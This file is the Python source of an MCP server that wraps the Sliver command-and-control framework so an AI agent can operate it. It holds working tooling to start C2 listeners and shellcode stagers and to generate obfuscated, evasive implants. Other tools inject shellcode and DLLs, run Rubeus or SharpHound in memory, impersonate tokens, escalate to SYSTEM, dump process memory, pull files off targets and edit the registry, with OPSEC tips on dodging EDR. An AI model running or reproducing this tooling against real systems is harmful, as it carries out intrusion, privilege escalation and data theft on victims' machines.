"""MCP server for Sliver C2 — exec, armory, listeners, implants.

Complements the official `sliver-client mcp` which covers filesystem ops.
"""

from __future__ import annotations

import argparse
import os
from contextlib import asynccontextmanager
from typing import Any, Optional

from mcp.server.fastmcp import Context, FastMCP

from sliver_mcp.client import SliverCtx, sliver_lifespan
from sliver_mcp.serializers import (
    b64d, b64e, decode_text_fields, err, fmt, pb_list_to_dicts, pb_to_dict,
)


_CONFIG_PATH: str | None = None


@asynccontextmanager
async def lifespan(server: FastMCP):
    if not _CONFIG_PATH:
        raise RuntimeError("sliver-mcp: operator config not set (call main())")
    async with sliver_lifespan(_CONFIG_PATH) as ctx:
        yield {"sliver": ctx}


mcp = FastMCP(
    "sliver-mcp",
    instructions=(
        "Sliver C2 MCP — exec, armory, listeners, implants, identity, recon, registry. "
        "Pair with `sliver-client mcp` which provides filesystem tools. "
        "Interactive tools accept target_kind='session'|'beacon' + target_id. "
        "Binary data (shellcode, assemblies, uploaded files) is base64-encoded on the wire."
    ),
    lifespan=lifespan,
)


def _ctx(ctx: Context) -> SliverCtx:
    return ctx.request_context.lifespan_context["sliver"]


async def _resolve(ctx: Context, target_kind: str, target_id: str):
    """Return (interactive_obj, kind) given target_kind + target_id."""
    sctx = _ctx(ctx)
    kwargs = {"session_id": target_id} if target_kind == "session" else {"beacon_id": target_id}
    return await sctx.resolve(**kwargs)


# ============================================================================
# META
# ============================================================================

@mcp.tool()
async def server_version(ctx: Context) -> str:
    """Return Sliver server version info."""
    return fmt(pb_to_dict(await _ctx(ctx).client.version()))


@mcp.tool()
async def list_operators(ctx: Context) -> str:
    """List connected operators."""
    return fmt(decode_text_fields(pb_list_to_dicts(await _ctx(ctx).client.operators())))


@mcp.tool()
async def list_sessions(ctx: Context) -> str:
    """List active interactive sessions."""
    return fmt(decode_text_fields(pb_list_to_dicts(await _ctx(ctx).client.sessions())))


@mcp.tool()
async def list_beacons(ctx: Context) -> str:
    """List active beacons (async callback implants)."""
    return fmt(decode_text_fields(pb_list_to_dicts(await _ctx(ctx).client.beacons())))


@mcp.tool()
async def list_jobs(ctx: Context) -> str:
    """List active jobs (listeners, stagers, websites)."""
    return fmt(decode_text_fields(pb_list_to_dicts(await _ctx(ctx).client.jobs())))


# ============================================================================
# LIFECYCLE — sessions
# ============================================================================

@mcp.tool()
async def get_session(ctx: Context, session_id: str) -> str:
    """Get a single session by ID."""
    s = await _ctx(ctx).client.session_by_id(session_id)
    return fmt(pb_to_dict(s)) if s else err("session not found", session_id=session_id)


@mcp.tool()
async def kill_session(ctx: Context, session_id: str, force: bool = False) -> str:
    """Terminate an active session."""
    await _ctx(ctx).client.kill_session(session_id, force=force)
    return fmt({"ok": True, "session_id": session_id})


@mcp.tool()
async def rename_session(ctx: Context, session_id: str, name: str) -> str:
    """Rename a session."""
    await _ctx(ctx).client.rename_session(session_id, name)
    return fmt({"ok": True, "session_id": session_id, "name": name})


# ============================================================================
# LIFECYCLE — beacons
# ============================================================================

@mcp.tool()
async def get_beacon(ctx: Context, beacon_id: str) -> str:
    """Get a single beacon by ID."""
    b = await _ctx(ctx).client.beacon_by_id(beacon_id)
    return fmt(pb_to_dict(b)) if b else err("beacon not found", beacon_id=beacon_id)


@mcp.tool()
async def kill_beacon(ctx: Context, beacon_id: str) -> str:
    """Kill a beacon."""
    await _ctx(ctx).client.kill_beacon(beacon_id)
    return fmt({"ok": True, "beacon_id": beacon_id})


@mcp.tool()
async def rename_beacon(ctx: Context, beacon_id: str, name: str) -> str:
    """Rename a beacon."""
    await _ctx(ctx).client.rename_beacon(beacon_id, name)
    return fmt({"ok": True, "beacon_id": beacon_id, "name": name})


@mcp.tool()
async def list_beacon_tasks(ctx: Context, beacon_id: str) -> str:
    """List queued + completed tasks for a beacon."""
    return fmt(decode_text_fields(pb_list_to_dicts(await _ctx(ctx).client.beacon_tasks(beacon_id))))


@mcp.tool()
async def get_beacon_task_result(ctx: Context, task_id: str, wait: bool = False, timeout_seconds: int = 60) -> str:
    """Return the result of a beacon task. If wait=True, poll until completion or timeout."""
    sctx = _ctx(ctx)
    if wait:
        result = await sctx.wait_beacon_task(task_id, timeout=float(timeout_seconds))
        response = result.get("response")
        return fmt({
            "task_id": task_id,
            "state": result.get("state"),
            "result": pb_to_dict(response) if response else None,
        })
    tasks = await sctx.client.beacon_task_content(task_id)
    return fmt([pb_to_dict(t) for t in tasks])


# ============================================================================
# LIFECYCLE — jobs
# ============================================================================

@mcp.tool()
async def kill_job(ctx: Context, job_id: int) -> str:
    """Kill an active job (listener/stager/website)."""
    r = await _ctx(ctx).client.kill_job(job_id)
    return fmt(decode_text_fields(pb_to_dict(r)))


# ============================================================================
# LISTENERS
# ============================================================================

@mcp.tool()
async def start_mtls_listener(ctx: Context, host: str = "0.0.0.0", port: int = 8888, persistent: bool = False) -> str:
    """Start an mTLS listener (sessions)."""
    r = await _ctx(ctx).client.start_mtls_listener(host, port, persistent)
    return fmt(decode_text_fields(pb_to_dict(r)))


@mcp.tool()
async def start_http_listener(ctx: Context, host: str = "0.0.0.0", port: int = 80, domain: str = "", website: str = "", persistent: bool = False) -> str:
    """Start an HTTP listener."""
    r = await _ctx(ctx).client.start_http_listener(host=host, port=port, website=website, domain=domain, persistent=persistent)
    return fmt(decode_text_fields(pb_to_dict(r)))


@mcp.tool()
async def start_https_listener(
    ctx: Context,
    host: str = "0.0.0.0",
    port: int = 443,
    domain: str = "",
    website: str = "",
    acme: bool = False,
    persistent: bool = False,
    randomize_jarm: bool = True,
) -> str:
    """Start an HTTPS listener."""
    r = await _ctx(ctx).client.start_https_listener(
        host=host, port=port, domain=domain, website=website,
        acme=acme, persistent=persistent, randomize_jarm=randomize_jarm,
    )
    return fmt(decode_text_fields(pb_to_dict(r)))


@mcp.tool()
async def start_dns_listener(
    ctx: Context,
    domains: list[str],
    host: str = "0.0.0.0",
    port: int = 53,
    canaries: bool = True,
    persistent: bool = False,
) -> str:
    """Start a DNS listener. `domains` is a list of C2 parent domains."""
    r = await _ctx(ctx).client.start_dns_listener(
        domains=domains, host=host, port=port, canaries=canaries, persistent=persistent,
    )
    return fmt(decode_text_fields(pb_to_dict(r)))


@mcp.tool()
async def start_wg_listener(
    ctx: Context,
    tun_ip: str,
    port: int = 53,
    n_port: int = 8888,
    key_port: int = 1337,
    persistent: bool = False,
) -> str:
    """Start a WireGuard listener."""
    r = await _ctx(ctx).client.start_wg_listener(
        tun_ip=tun_ip, port=port, n_port=n_port, key_port=key_port, persistent=persistent,
    )
    return fmt(decode_text_fields(pb_to_dict(r)))


@mcp.tool()
async def start_http_stager_listener(ctx: Context, host: str, port: int, data_base64: str) -> str:
    """Start an HTTP stager listener hosting shellcode."""
    r = await _ctx(ctx).client.start_http_stager_listener(host=host, port=port, data=b64d(data_base64))
    return fmt(decode_text_fields(pb_to_dict(r)))


# ============================================================================
# IMPLANTS
# ============================================================================

@mcp.tool()
async def list_implant_builds(ctx: Context) -> str:
    """List all implant builds (name → config)."""
    builds = await _ctx(ctx).client.implant_builds()
    return fmt({k: pb_to_dict(v) for k, v in (builds or {}).items()})


@mcp.tool()
async def delete_implant_build(ctx: Context, implant_name: str) -> str:
    """Delete a named implant build."""
    await _ctx(ctx).client.delete_implant_build(implant_name)
    return fmt({"ok": True, "implant_name": implant_name})


@mcp.tool()
async def list_implant_profiles(ctx: Context) -> str:
    """List saved implant generation profiles."""
    return fmt(decode_text_fields(pb_list_to_dicts(await _ctx(ctx).client.implant_profiles())))


@mcp.tool()
async def delete_implant_profile(ctx: Context, profile_name: str) -> str:
    """Delete a saved implant profile."""
    await _ctx(ctx).client.delete_implant_profile(profile_name)
    return fmt({"ok": True, "profile_name": profile_name})


@mcp.tool()
async def regenerate_implant(ctx: Context, implant_name: str) -> str:
    """Regenerate a previously built implant. Returns file bytes as base64 under `file.data_base64`."""
    r = await _ctx(ctx).client.regenerate_implant(implant_name)
    d = pb_to_dict(r)
    if r and getattr(r, "File", None) and getattr(r.File, "Data", None):
        d.setdefault("file", {})
        d["file"]["data_base64"] = b64e(r.File.Data)
        d["file"]["byte_len"] = len(r.File.Data)
    return fmt(d)


@mcp.tool()
async def shellcode_from_implant(ctx: Context, data_base64: str, function_name: str, arguments: str = "") -> str:
    """Convert a DLL implant (provided base64) to shellcode via sRDI. Returns `shellcode.data_base64`."""
    r = await _ctx(ctx).client.shellcode(b64d(data_base64), function_name, arguments)
    d = pb_to_dict(r)
    if r and getattr(r, "Data", None):
        d["data_base64"] = b64e(r.Data)
        d["byte_len"] = len(r.Data)
    return fmt(d)


@mcp.tool()
async def generate_implant(
    ctx: Context,
    name: str = "",
    os: str = "windows",
    arch: str = "amd64",
    format: str = "EXECUTABLE",
    c2s: Optional[list[dict]] = None,
    is_beacon: bool = False,
    beacon_interval_ms: int = 60000,
    beacon_jitter_ms: int = 30000,
    debug: bool = False,
    evasion: bool = True,
    obfuscate_symbols: bool = True,
    reconnect_interval_s: int = 60,
    max_connection_errors: int = 100,
) -> str:
    """Generate a new Sliver implant. Returns `file.data_base64` on success.

    `c2s`: list of dicts like [{"url":"mtls://10.10.14.1:8888","priority":0}]
    `format`: EXECUTABLE | SHARED_LIB | SHELLCODE | SERVICE
    `os`: windows | linux | darwin
    `arch`: amd64 | 386 | arm64
    """
    from sliver.pb.clientpb import client_pb2
    fmt_enum = {
        "EXECUTABLE": 0, "SHARED_LIB": 1, "SHELLCODE": 2, "SERVICE": 3,
    }
    cfg = client_pb2.ImplantConfig()
    cfg.GOOS = os
    cfg.GOARCH = arch
    cfg.Format = fmt_enum.get(format.upper(), 0)
    cfg.IsBeacon = is_beacon
    cfg.BeaconInterval = beacon_interval_ms * 1000000  # ms → ns
    cfg.BeaconJitter = beacon_jitter_ms * 1000000
    cfg.Debug = debug
    cfg.Evasion = evasion
    cfg.ObfuscateSymbols = obfuscate_symbols
    cfg.ReconnectInterval = reconnect_interval_s
    cfg.MaxConnectionErrors = max_connection_errors
    if name:
        cfg.Name = name
    for c2 in (c2s or []):
        slot = cfg.C2.add()
        slot.URL = c2.get("url", "")
        slot.Priority = int(c2.get("priority", 0))
    r = await _ctx(ctx).client.generate_implant(cfg, timeout=600)
    d = pb_to_dict(r)
    if r and getattr(r, "File", None) and getattr(r.File, "Data", None):
        d.setdefault("file", {})
        d["file"]["data_base64"] = b64e(r.File.Data)
        d["file"]["byte_len"] = len(r.File.Data)
    return fmt(d)


# ============================================================================
# INTERACTIVE — execution (unified session + beacon)
# ============================================================================

async def _exec_core(ctx: Context, target_kind: str, target_id: str, exe: str, args: list[str], output: bool = True) -> str:
    obj, _ = await _resolve(ctx, target_kind, target_id)
    r = await obj.execute(exe, args, output)
    return fmt(decode_text_fields(pb_to_dict(r)))


@mcp.tool()
async def exec_binary(
    ctx: Context, target_kind: str, target_id: str,
    exe: str, args: Optional[list[str]] = None, output: bool = True,
) -> str:
    """Execute a binary at a full path on the target with optional args.

    `target_kind`: "session" | "beacon"
    `exe`: full path like C:\\Windows\\System32\\cmd.exe or /usr/bin/id
    `args`: list of argument strings
    `output`: capture stdout/stderr (sessions only; beacons always async)
    """
    return await _exec_core(ctx, target_kind, target_id, exe, args or [], output)


@mcp.tool()
async def exec_cmd(ctx: Context, target_kind: str, target_id: str, command: str) -> str:
    """Run a Windows cmd.exe command."""
    return await _exec_core(ctx, target_kind, target_id, r"C:\Windows\System32\cmd.exe", ["/c", command], True)


@mcp.tool()
async def exec_powershell(ctx: Context, target_kind: str, target_id: str, command: str) -> str:
    """Run a PowerShell command via powershell.exe."""
    return await _exec_core(
        ctx, target_kind, target_id,
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        ["-NoProfile", "-NonInteractive", "-Command", command], True,
    )


@mcp.tool()
async def exec_shell(ctx: Context, target_kind: str, target_id: str, command: str) -> str:
    """Run a POSIX /bin/sh command."""
    return await _exec_core(ctx, target_kind, target_id, "/bin/sh", ["-c", command], True)


@mcp.tool()
async def exec_shellcode(
    ctx: Context, target_kind: str, target_id: str,
    shellcode_base64: str, pid: int = 0, rwx: bool = False, encoder: str = "",
) -> str:
    """Inject shellcode into a remote process.

    `pid=0` spawns a new sacrificial process. `rwx=True` allocates RWX memory (noisier to EDR).
    `encoder`: "" or "gzip".
    """
    obj, _ = await _resolve(ctx, target_kind, target_id)
    r = await obj.execute_shellcode(b64d(shellcode_base64), rwx, pid, encoder)
    return fmt(decode_text_fields(pb_to_dict(r)))


@mcp.tool()
async def exec_assembly(
    ctx: Context, target_kind: str, target_id: str,
    assembly_base64: str,
    arguments: str = "",
    process: str = "notepad.exe",
    is_dll: bool = False,
    arch: str = "x64",
    class_name: str = "",
    method: str = "",
    app_domain: str = "",
) -> str:
    """Execute a .NET assembly in-memory on Windows via execute-assembly.

    Default host process `notepad.exe`; override for OPSEC. For typical armory assemblies
    (Rubeus, SharpHound, Seatbelt), leave class_name/method/app_domain empty.
    """
    obj, _ = await _resolve(ctx, target_kind, target_id)
    r = await obj.execute_assembly(
        b64d(assembly_base64), arguments, process, is_dll, arch,
        class_name, method, app_domain,
    )
    return fmt(decode_text_fields(pb_to_dict(r)))


@mcp.tool()
async def exec_sideload(
    ctx: Context, target_kind: str, target_id: str,
    data_base64: str, process_name: str = "notepad.exe",
    arguments: str = "", entry_point: str = "", kill: bool = True,
) -> str:
    """Reflectively sideload a DLL/shared object into a new process."""
    obj, _ = await _resolve(ctx, target_kind, target_id)
    r = await obj.sideload(b64d(data_base64), process_name, arguments, entry_point, kill)
    return fmt(decode_text_fields(pb_to_dict(r)))


@mcp.tool()
async def exec_spawn_dll(
    ctx: Context, target_kind: str, target_id: str,
    data_base64: str, process_name: str = "notepad.exe",
    arguments: str = "", entry_point: str = "", kill: bool = True,
) -> str:
    """Classic DLL injection into a spawned process (Windows)."""
    obj, _ = await _resolve(ctx, target_kind, target_id)
    r = await obj.spawn_dll(b64d(data_base64), process_name, arguments, entry_point, kill)
    return fmt(decode_text_fields(pb_to_dict(r)))


# ============================================================================
# INTERACTIVE — file transfer (binary-safe; complements upstream fs_cat)
# ============================================================================

@mcp.tool()
async def fs_upload_binary(
    ctx: Context, target_kind: str, target_id: str,
    remote_path: str, data_base64: str, is_ioc: bool = False,
) -> str:
    """Upload a base64-encoded binary blob to a remote path."""
    obj, _ = await _resolve(ctx, target_kind, target_id)
    r = await obj.upload(remote_path, b64d(data_base64), is_ioc)
    return fmt(decode_text_fields(pb_to_dict(r)))


@mcp.tool()
async def fs_download_binary(
    ctx: Context, target_kind: str, target_id: str,
    remote_path: str, recurse: bool = False,
) -> str:
    """Download a remote file and return its contents base64-encoded."""
    obj, _ = await _resolve(ctx, target_kind, target_id)
    r = await obj.download(remote_path, recurse)
    d = pb_to_dict(r)
    raw = getattr(r, "Data", None)
    if raw:
        d["data_base64"] = b64e(raw)
        d["byte_len"] = len(raw)
    return fmt(d)


# ============================================================================
# INTERACTIVE — identity (Windows)
# ============================================================================

@mcp.tool()
async def id_impersonate(ctx: Context, target_kind: str, target_id: str, username: str) -> str:
    """Impersonate a user via their token (Windows)."""
    obj, _ = await _resolve(ctx, target_kind, target_id)
    return fmt(pb_to_dict(await obj.impersonate(username)))


@mcp.tool()
async def id_run_as(ctx: Context, target_kind: str, target_id: str, username: str, process_name: str, args: str = "") -> str:
    """Run a process as another user (Windows, RunAs)."""
    obj, _ = await _resolve(ctx, target_kind, target_id)
    return fmt(pb_to_dict(await obj.run_as(username, process_name, args)))


@mcp.tool()
async def id_revert_to_self(ctx: Context, target_kind: str, target_id: str) -> str:
    """Revert token impersonation back to original identity."""
    obj, _ = await _resolve(ctx, target_kind, target_id)
    return fmt(pb_to_dict(await obj.revert_to_self()))


@mcp.tool()
async def id_make_token(ctx: Context, target_kind: str, target_id: str, username: str, password: str, domain: str = "") -> str:
    """Create a new logon token for username/password (Windows)."""
    obj, _ = await _resolve(ctx, target_kind, target_id)
    return fmt(pb_to_dict(await obj.make_token(username, password, domain)))


@mcp.tool()
async def id_get_system(ctx: Context, target_kind: str, target_id: str, implant_name: str, hosting_process: str = "spoolsv.exe") -> str:
    """Elevate to NT AUTHORITY\\SYSTEM via named-pipe impersonation.

    Requires a built implant_name to derive the config for the spawned helper process.
    """
    sctx = _ctx(ctx)
    builds = await sctx.client.implant_builds()
    config = (builds or {}).get(implant_name)
    if config is None:
        return err("implant_name not found in builds — list with list_implant_builds", implant_name=implant_name)
    obj, _ = await _resolve(ctx, target_kind, target_id)
    r = await obj.get_system(hosting_process, config)
    return fmt(decode_text_fields(pb_to_dict(r)))


# ============================================================================
# INTERACTIVE — recon
# ============================================================================

@mcp.tool()
async def recon_ps(ctx: Context, target_kind: str, target_id: str) -> str:
    """List remote processes."""
    obj, _ = await _resolve(ctx, target_kind, target_id)
    return fmt(decode_text_fields(pb_list_to_dicts(await obj.ps())))


@mcp.tool()
async def recon_netstat(
    ctx: Context, target_kind: str, target_id: str,
    tcp: bool = True, udp: bool = True, ipv4: bool = True, ipv6: bool = True, listening: bool = True,
) -> str:
    """List remote network connections."""
    obj, _ = await _resolve(ctx, target_kind, target_id)
    return fmt(pb_to_dict(await obj.netstat(tcp, udp, ipv4, ipv6, listening)))


@mcp.tool()
async def recon_ifconfig(ctx: Context, target_kind: str, target_id: str) -> str:
    """List remote network interfaces."""
    obj, _ = await _resolve(ctx, target_kind, target_id)
    return fmt(pb_to_dict(await obj.ifconfig()))


@mcp.tool()
async def recon_screenshot(ctx: Context, target_kind: str, target_id: str, save_to: Optional[str] = None) -> str:
    """Capture a desktop screenshot. If `save_to` is given, write PNG locally and return the path.
    Otherwise return base64 (may be very large)."""
    obj, _ = await _resolve(ctx, target_kind, target_id)
    r = await obj.screenshot()
    data = getattr(r, "Data", b"") or b""
    if save_to:
        with open(save_to, "wb") as f:
            f.write(data)
        return fmt({"saved_to": save_to, "byte_len": len(data)})
    d = pb_to_dict(r)
    d["data_base64"] = b64e(data)
    d["byte_len"] = len(data)
    return fmt(d)


@mcp.tool()
async def recon_process_dump(ctx: Context, target_kind: str, target_id: str, pid: int, save_to: Optional[str] = None) -> str:
    """Dump a remote process's memory. Returns base64 or writes to `save_to`."""
    obj, _ = await _resolve(ctx, target_kind, target_id)
    r = await obj.process_dump(pid)
    data = getattr(r, "Data", b"") or b""
    if save_to:
        with open(save_to, "wb") as f:
            f.write(data)
        return fmt({"saved_to": save_to, "byte_len": len(data)})
    d = pb_to_dict(r)
    d["data_base64"] = b64e(data)
    d["byte_len"] = len(data)
    return fmt(d)


@mcp.tool()
async def recon_ping(ctx: Context, target_kind: str, target_id: str) -> str:
    """Ping the implant (liveness check, not ICMP)."""
    obj, _ = await _resolve(ctx, target_kind, target_id)
    return fmt(pb_to_dict(await obj.ping()))


# ============================================================================
# INTERACTIVE — env
# ============================================================================

@mcp.tool()
async def env_get(ctx: Context, target_kind: str, target_id: str, name: str) -> str:
    """Get a remote environment variable."""
    obj, _ = await _resolve(ctx, target_kind, target_id)
    return fmt(pb_to_dict(await obj.get_env(name)))


@mcp.tool()
async def env_set(ctx: Context, target_kind: str, target_id: str, key: str, value: str) -> str:
    """Set a remote environment variable."""
    obj, _ = await _resolve(ctx, target_kind, target_id)
    return fmt(pb_to_dict(await obj.set_env(key, value)))


@mcp.tool()
async def env_unset(ctx: Context, target_kind: str, target_id: str, key: str) -> str:
    """Unset a remote environment variable."""
    obj, _ = await _resolve(ctx, target_kind, target_id)
    return fmt(pb_to_dict(await obj.unset_env(key)))


# ============================================================================
# INTERACTIVE — registry (Windows)
# ============================================================================

@mcp.tool()
async def reg_read(ctx: Context, target_kind: str, target_id: str, hive: str, reg_path: str, key: str, hostname: str = "") -> str:
    """Read a Windows registry value. hive: HKCU|HKLM|HKCR|HKCC|HKU."""
    obj, _ = await _resolve(ctx, target_kind, target_id)
    return fmt(pb_to_dict(await obj.registry_read(hive, reg_path, key, hostname)))


@mcp.tool()
async def reg_write(
    ctx: Context, target_kind: str, target_id: str,
    hive: str, reg_path: str, key: str,
    value_type: str = "string",
    string_value: str = "",
    byte_value_base64: str = "",
    dword_value: int = 0,
    qword_value: int = 0,
    hostname: str = "",
) -> str:
    """Write a Windows registry value. value_type: string|byte|dword|qword.

    RegistryType enum: 0=binary 1=DWORD 2=QWORD 3=SZ 4=ExpandSZ 5=MultiSZ
    """
    type_map = {"byte": 0, "dword": 1, "qword": 2, "string": 3, "expand": 4, "multi": 5}
    reg_type = type_map.get(value_type.lower(), 3)
    obj, _ = await _resolve(ctx, target_kind, target_id)
    r = await obj.registry_write(
        hive, reg_path, key, hostname,
        string_value, b64d(byte_value_base64), dword_value, qword_value, reg_type,
    )
    return fmt(decode_text_fields(pb_to_dict(r)))


@mcp.tool()
async def reg_create_key(ctx: Context, target_kind: str, target_id: str, hive: str, reg_path: str, key: str, hostname: str = "") -> str:
    """Create a Windows registry key."""
    obj, _ = await _resolve(ctx, target_kind, target_id)
    return fmt(pb_to_dict(await obj.registry_create_key(hive, reg_path, key, hostname)))


# ============================================================================
# INTERACTIVE — lifecycle
# ============================================================================

@mcp.tool()
async def target_terminate(ctx: Context, target_kind: str, target_id: str, pid: int, force: bool = False) -> str:
    """Terminate a process on the remote target by PID."""
    obj, _ = await _resolve(ctx, target_kind, target_id)
    return fmt(pb_to_dict(await obj.terminate(pid, force)))


@mcp.tool()
async def target_migrate(ctx: Context, session_id: str, pid: int, implant_name: str) -> str:
    """Migrate session into another process (session only, Windows). `implant_name` from list_implant_builds."""
    sctx = _ctx(ctx)
    builds = await sctx.client.implant_builds()
    config = (builds or {}).get(implant_name)
    if config is None:
        return err("implant_name not found in builds", implant_name=implant_name)
    s = await sctx.client.interact_session(session_id)
    if s is None:
        return err("session not found", session_id=session_id)
    return fmt(pb_to_dict(await s.migrate(pid, config)))


# ============================================================================
# SESSION-ONLY
# ============================================================================

@mcp.tool()
async def session_pivot_listeners(ctx: Context, session_id: str) -> str:
    """List pivot listeners on a session."""
    s = await _ctx(ctx).client.interact_session(session_id)
    if s is None:
        return err("session not found", session_id=session_id)
    return fmt(decode_text_fields(pb_list_to_dicts(await s.pivot_listeners())))


# ============================================================================
# WEBSITES
# ============================================================================

@mcp.tool()
async def list_websites(ctx: Context) -> str:
    """List all hosted websites."""
    return fmt(decode_text_fields(pb_list_to_dicts(await _ctx(ctx).client.websites())))


@mcp.tool()
async def add_website_content(
    ctx: Context, name: str, web_path: str, content_type: str, content_base64: str,
) -> str:
    """Add file content to a website at web_path."""
    r = await _ctx(ctx).client.add_website_content(name, web_path, content_type, b64d(content_base64))
    return fmt(decode_text_fields(pb_to_dict(r)))


@mcp.tool()
async def remove_website_content(ctx: Context, name: str, paths: list[str]) -> str:
    """Remove files from a website by paths."""
    r = await _ctx(ctx).client.remove_website_content(name, paths)
    return fmt(decode_text_fields(pb_to_dict(r)))


@mcp.tool()
async def remove_website(ctx: Context, name: str) -> str:
    """Remove a whole website."""
    await _ctx(ctx).client.remove_website(name)
    return fmt({"ok": True, "name": name})


# ============================================================================
# MAIN
# ============================================================================

def main() -> None:
    global _CONFIG_PATH
    parser = argparse.ArgumentParser(prog="sliver-mcp")
    parser.add_argument(
        "--operator-config", "--config",
        default=os.environ.get("SLIVER_OPERATOR_CONFIG"),
        help="Path to Sliver operator .cfg (mTLS). Env: SLIVER_OPERATOR_CONFIG",
    )
    args = parser.parse_args()
    if not args.operator_config:
        parser.error("--operator-config required (or set SLIVER_OPERATOR_CONFIG)")
    _CONFIG_PATH = args.operator_config
    mcp.run()


if __name__ == "__main__":
    main()
